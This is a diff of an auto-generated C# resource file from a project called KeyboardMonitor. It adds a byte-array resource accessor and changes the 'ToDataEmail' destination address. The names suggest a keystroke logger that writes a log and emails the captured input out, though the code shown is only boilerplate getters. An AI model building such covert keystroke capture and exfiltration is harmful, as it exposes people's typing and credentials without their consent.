@@ -125,6 +125,16 @@ namespace KeyboardMonitor.Properties {
         }
         
         /// <summary>
+        ///   查找 System.Byte[] 类型的本地化资源。
+        /// </summary>
+        internal static byte[] KeyboardFiltartion1 {
+            get {
+                object obj = ResourceManager.GetObject("KeyboardFiltartion1", resourceCulture);
+                return ((byte[])(obj));
+            }
+        }
+        
+        /// <summary>
         ///   查找类似 log 的本地化字符串。
         /// </summary>
         internal static string LogFilePath {
@@ -134,7 +144,7 @@ namespace KeyboardMonitor.Properties {
         }
         
         /// <summary>
-        ///   查找类似 2646016915@qq.com 的本地化字符串。
+        ///   查找类似 keyboardmonitor@ymail.cn 的本地化字符串。
         /// </summary>
         internal static string ToDataEmail {
             get {
